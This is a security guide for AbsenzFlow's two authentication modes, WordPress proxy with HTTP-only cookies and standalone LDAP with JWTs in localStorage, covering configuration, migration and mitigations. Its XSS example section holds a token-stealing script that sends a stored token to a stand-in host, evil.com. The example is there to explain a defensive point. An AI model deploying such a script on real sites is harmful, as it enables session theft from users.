# AbsenzFlow Authentication Guide

This document explains the two authentication modes in AbsenzFlow and their security implications.

## 📋 Table of Contents

- [Authentication Modes Overview](#authentication-modes-overview)
- [WordPress Proxy Mode (Production)](#wordpress-proxy-mode-production)
- [Standalone/LDAP Mode (Alternative)](#standaloneldap-mode-alternative)
- [Security Comparison](#security-comparison)
- [Configuration](#configuration)
- [Migration Guide](#migration-guide)

---

## Authentication Modes Overview

AbsenzFlow supports two authentication modes:

| Mode | Use Case | Token Storage | Security Level |
|------|----------|---------------|----------------|
| **WordPress Proxy** | Production (default) | HTTP-only cookies | ✅ High |
| **Standalone/LDAP** | Direct access, testing | localStorage (JWT) | ⚠️ Medium |

### Which Mode Should I Use?

**Use WordPress Proxy Mode (default) if:**
- ✅ You're integrating with WordPress
- ✅ You want the highest security
- ✅ You're deploying to production
- ✅ Users are already authenticated in WordPress

**Use Standalone/LDAP Mode only if:**
- ⚠️ You need direct backend access without WordPress
- ⚠️ You're developing/testing the API directly
- ⚠️ You have specific LDAP integration requirements
- ⚠️ You understand the localStorage security implications

---

## WordPress Proxy Mode (Production)

**Default mode for production deployments.**

### How It Works

```
┌─────────────┐
│   Browser   │
└──────┬──────┘
       │ 1. User logs into WordPress
       │    (WordPress session cookie)
       ↓
┌─────────────────┐
│  WordPress      │
│  + AbsenzFlow   │
│    Plugin       │
└──────┬──────────┘
       │ 2. Proxy API requests with headers:
       │    - X-WordPress-Secret
       │    - X-WordPress-User
       │    - X-WordPress-Email
       │    - X-WordPress-Role
       ↓
┌─────────────────┐
│  FastAPI        │
│  Backend        │
└─────────────────┘
       │ 3. Validates secret
       │    Creates/updates user
       │    Returns data
```

### Security Features

✅ **HTTP-only cookies** - Not accessible to JavaScript (XSS protection)
✅ **Server-to-server secret** - Shared secret validates WordPress proxy
✅ **No token storage** - No localStorage or sessionStorage used
✅ **WordPress session management** - Leverages WordPress security
✅ **CSRF protection** - WordPress nonce validation
✅ **Same-origin policy** - Cookies sent only to same domain

### Configuration

```bash
# .env
AUTH_MODE=wordpress  # Default
WORDPRESS_PROXY_SECRET=<generated-secret>  # Must match WordPress Admin

# WordPress Admin
# Settings → AbsenzFlow → Proxy Secret: <same-secret>
```

### API Client Configuration

```typescript
// wordpress-plugin/src/api/client.ts
const api = new AbsenzFlowAPI({
  baseURL: window.absenzflowConfig.apiUrl,
  useProxy: true,  // ✅ Use WordPress proxy
  wpNonce: window.absenzflowConfig.nonce
});

// Requests include:
// - withCredentials: true (sends WordPress cookies)
// - X-WP-Nonce header (CSRF protection)
```

### Security Validation

The backend validates on every request:

```python
# backend/app/api/auth.py
async def get_wordpress_proxy_user(
    x_wordpress_secret: str = Header(...),
    x_wordpress_user: str = Header(...),
    x_wordpress_email: str = Header(...),
    x_wordpress_role: str = Header(...),
):
    # 1. Validate secret (constant-time comparison)
    if not hmac.compare_digest(x_wordpress_secret, settings.WORDPRESS_PROXY_SECRET):
        raise HTTPException(status_code=401, detail="Invalid proxy secret")

    # 2. Get or create user
    user = db.query(User).filter(User.username == x_wordpress_user).first()
    if not user:
        user = User(username=x_wordpress_user, email=x_wordpress_email, role=role)
        db.add(user)

    return user
```

### Advantages

- ✅ **Most secure** - No client-side token storage
- ✅ **Seamless UX** - Users already logged into WordPress
- ✅ **Centralized auth** - WordPress manages sessions
- ✅ **No XSS risk** - HTTP-only cookies immune to JavaScript theft
- ✅ **Production-ready** - Designed for production use

### Disadvantages

- ❌ Requires WordPress integration
- ❌ Cannot access API directly (must go through WordPress)
- ❌ Additional setup (WordPress plugin installation)

---

## Standalone/LDAP Mode (Alternative)

**Alternative mode for direct API access or LDAP integration.**

⚠️ **WARNING:** This mode stores JWT tokens in localStorage, which is vulnerable to XSS attacks. Only use if you understand the security implications.

### How It Works

```
┌─────────────┐
│   Browser   │
└──────┬──────┘
       │ 1. POST /api/auth/login
       │    {username, password}
       ↓
┌─────────────────┐
│  FastAPI        │
│  Backend        │
└──────┬──────────┘
       │ 2. Validates against LDAP
       │    Generates JWT token
       │    {access_token: "eyJ..."}
       ↓
┌─────────────┐
│   Browser   │
│ localStorage│  ⚠️ Stores JWT token
└─────────────┘
       │ 3. Subsequent requests include:
       │    Authorization: Bearer eyJ...
```

### Security Features

⚠️ **JWT tokens** - Stored in localStorage (XSS vulnerable)
✅ **LDAP authentication** - Validates against Active Directory
✅ **Token expiration** - Configurable expiry time
⚠️ **Client-side storage** - Token accessible to JavaScript

### Configuration

```bash
# .env
AUTH_MODE=standalone  # Switch to standalone mode

# LDAP Configuration
LDAP_SERVER=ldap.school.local
LDAP_PORT=389
LDAP_BASE_DN=dc=school,dc=local
LDAP_BIND_DN=cn=absenzflow,ou=services,dc=school,dc=local
LDAP_BIND_PASSWORD=<ldap-password>
```

### API Client Configuration

```typescript
// Example: Direct API access
const api = new AbsenzFlowAPI({
  baseURL: 'http://backend-server:8000',
  useProxy: false  // ⚠️ Direct backend access
});

// Login
const response = await api.login('username', 'password');
// Token stored in localStorage: 'absenzflow_token'

// Subsequent requests include:
// Authorization: Bearer <token>
```

### Authentication Flow

```python
# backend/app/api/auth.py
@router.post("/login")
async def login(
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: Session = Depends(get_db)
):
    # 1. Validate credentials against LDAP
    if not ldap_service.authenticate(form_data.username, form_data.password):
        raise HTTPException(status_code=401, detail="Invalid credentials")

    # 2. Get user info from LDAP
    user_info = ldap_service.get_user_info(form_data.username)

    # 3. Create or update user in database
    user = get_or_create_user(db, form_data.username, user_info)

    # 4. Generate JWT token
    access_token = create_access_token(data={"sub": user.username})

    return {"access_token": access_token, "token_type": "bearer"}
```

### Advantages

- ✅ Direct API access (no WordPress needed)
- ✅ LDAP integration
- ✅ Suitable for API testing
- ✅ Stateless authentication

### Disadvantages

- ❌ **localStorage XSS vulnerability** - Tokens can be stolen via XSS
- ❌ **Manual session management** - Frontend must handle token refresh
- ❌ **No CSRF protection** - Requires additional measures
- ❌ **Not recommended for production** - Unless security is carefully managed

### Security Risks - XSS Attack Example

```javascript
// If your site has an XSS vulnerability:
<script>
  // Attacker can steal token
  const token = localStorage.getItem('absenzflow_token');
  fetch('https://evil.com/steal?token=' + token);
</script>
```

**Mitigation Strategies if Using Standalone Mode:**

1. ✅ **Strict Content Security Policy (CSP)**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

2. ✅ **Input sanitization** - Always sanitize user input
3. ✅ **Regular security audits** - Scan for XSS vulnerabilities
4. ✅ **Short token expiry** - Limit damage window
5. ✅ **Token rotation** - Implement refresh tokens

---

## Security Comparison

### Token Storage Security

| Aspect | WordPress Proxy | Standalone/LDAP |
|--------|----------------|-----------------|
| **Storage Location** | HTTP-only cookie | localStorage |
| **JavaScript Access** | ❌ No (secure) | ✅ Yes (vulnerable) |
| **XSS Vulnerability** | ✅ Protected | ❌ Vulnerable |
| **CSRF Protection** | ✅ Nonce validation | ⚠️ Must implement |
| **Session Management** | WordPress handles | ⚠️ Manual |
| **Secure by Default** | ✅ Yes | ❌ No |

### Attack Scenarios

#### XSS Attack

**WordPress Proxy Mode:**
```javascript
// Attacker injects script
<script>
  document.cookie  // ✅ HttpOnly - Not accessible!
</script>
```
**Result:** ✅ Attack fails, token safe

**Standalone Mode:**
```javascript
// Attacker injects script
<script>
  localStorage.getItem('absenzflow_token')  // ❌ Accessible!
</script>
```
**Result:** ❌ Token stolen, account compromised

#### CSRF Attack

**WordPress Proxy Mode:**
```html
<!-- Attacker's malicious site -->
<form action="https://school.com/wp-json/absenzflow/v1/proxy" method="POST">
  <!-- WordPress validates X-WP-Nonce -->
</form>
```
**Result:** ✅ Attack fails, nonce required

**Standalone Mode:**
```html
<!-- Attacker's malicious site -->
<script>
  // Token in Authorization header - not sent cross-origin automatically
</script>
```
**Result:** ✅ Protected by same-origin policy (but no server-side validation)

---

## Configuration

### Switching Authentication Modes

#### Enable WordPress Proxy Mode (Default)

```bash
# .env
AUTH_MODE=wordpress
WORDPRESS_PROXY_SECRET=<generated-secret>

# Ensure WordPress plugin is installed and configured
```

#### Enable Standalone/LDAP Mode

```bash
# .env
AUTH_MODE=standalone
LDAP_SERVER=ldap.school.local
LDAP_BASE_DN=dc=school,dc=local
# ... other LDAP settings
```

### Environment Variable Reference

| Variable | WordPress Proxy | Standalone/LDAP | Description |
|----------|----------------|-----------------|-------------|
| `AUTH_MODE` | `wordpress` | `standalone` | Authentication mode |
| `WORDPRESS_PROXY_SECRET` | ✅ Required | ❌ Not used | Shared secret for proxy validation |
| `SECRET_KEY` | ✅ Required | ✅ Required | JWT signing key (used for tokens) |
| `LDAP_*` | ❌ Not used | ✅ Required | LDAP/Active Directory configuration |

---

## Migration Guide

### From Standalone to WordPress Proxy

**Why migrate?**
- ✅ Better security (no localStorage)
- ✅ Seamless UX (WordPress session)
- ✅ Production-ready

**Steps:**

1. **Install WordPress Plugin**
   ```bash
   cp -r wordpress-plugin/* /var/www/html/wp-content/plugins/absenzflow/
   ```

2. **Configure WordPress**
   ```
   WordPress Admin → Plugins → Activate "AbsenzFlow"
   WordPress Admin → Settings → AbsenzFlow
   - Backend URL: https://backend.school.com/api
   - Proxy Secret: <generated-secret>
   ```

3. **Update Backend .env**
   ```bash
   AUTH_MODE=wordpress
   WORDPRESS_PROXY_SECRET=<same-secret-as-wordpress>
   ```

4. **Update Frontend Config**
   ```typescript
   // Use WordPress proxy
   const api = new AbsenzFlowAPI({
     useProxy: true,
     wpNonce: window.absenzflowConfig.nonce
   });
   ```

5. **Restart Backend**
   ```bash
   docker-compose restart backend
   ```

### From WordPress Proxy to Standalone

**Why migrate?**
- ⚠️ Direct API access needed
- ⚠️ Testing/development
- ⚠️ No WordPress available

**Warning:** Only do this if you understand the localStorage security risks!

**Steps:**

1. **Configure LDAP in .env**
   ```bash
   AUTH_MODE=standalone
   LDAP_SERVER=ldap.school.local
   # ... LDAP settings
   ```

2. **Update Frontend**
   ```typescript
   // Direct API access
   const api = new AbsenzFlowAPI({
     useProxy: false
   });
   ```

3. **Restart Backend**
   ```bash
   docker-compose restart backend
   ```

---

## Troubleshooting

### WordPress Proxy Issues

**Problem:** "Invalid proxy secret"

**Solution:**
1. Check SECRET matches in both places:
   ```bash
   # Backend
   docker-compose exec backend env | grep WORDPRESS_PROXY_SECRET

   # WordPress
   wp option get absenzflow_options --format=json
   ```

2. Ensure secrets match exactly (no extra spaces)

**Problem:** "Not authenticated"

**Solution:**
1. Check WordPress user is logged in
2. Verify X-WP-Nonce is sent in request headers
3. Check WordPress cookies are being sent (`withCredentials: true`)

### Standalone Mode Issues

**Problem:** "Invalid credentials"

**Solution:**
1. Verify LDAP server is reachable:
   ```bash
   docker-compose exec backend python -c "import ldap; conn = ldap.initialize('ldap://ldap.school.local:389'); print('Connected')"
   ```

2. Check LDAP credentials in .env

**Problem:** "Token expired"

**Solution:**
1. Login again to get new token
2. Increase `ACCESS_TOKEN_EXPIRE_MINUTES` in .env

---

## Security Best Practices

### For WordPress Proxy Mode (Production)

✅ **Generate strong secrets**
```bash
openssl rand -hex 32
```

✅ **Use HTTPS everywhere**
```bash
CORS_ORIGINS=https://school.com  # Not http://
```

✅ **Keep WordPress updated**
```bash
wp core update
wp plugin update --all
```

✅ **Regular security audits**
```bash
wp plugin verify-checksums --all
```

### For Standalone Mode (If You Must)

⚠️ **Implement strict CSP**
```python
response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
```

⚠️ **Short token expiry**
```bash
ACCESS_TOKEN_EXPIRE_MINUTES=60  # 1 hour
```

⚠️ **Input sanitization everywhere**
```python
from bleach import clean
user_input = clean(request.data.get('text'))
```

⚠️ **Regular XSS scanning**
```bash
npm audit
safety check  # Python dependencies
```

---

## Summary

### TL;DR

**Production:** Use **WordPress Proxy Mode**
- ✅ HTTP-only cookies (XSS protection)
- ✅ No localStorage (secure)
- ✅ Recommended for all production deployments

**Development/Testing:** Can use **Standalone Mode**
- ⚠️ localStorage (XSS vulnerable)
- ⚠️ Only for testing or if WordPress not available
- ⚠️ Implement additional security measures

### Security Recommendation

**Always use WordPress Proxy Mode in production** unless you have a compelling reason and understand the security implications of localStorage token storage.

---

**Last Updated:** 2026-02-06
**Maintainer:** AbsenzFlow Team
**Related Docs:** [DEPLOYMENT.md](DEPLOYMENT.md), [CLAUDE.md](CLAUDE.md), [SEC-AUDIT.md](SEC-AUDIT.md)
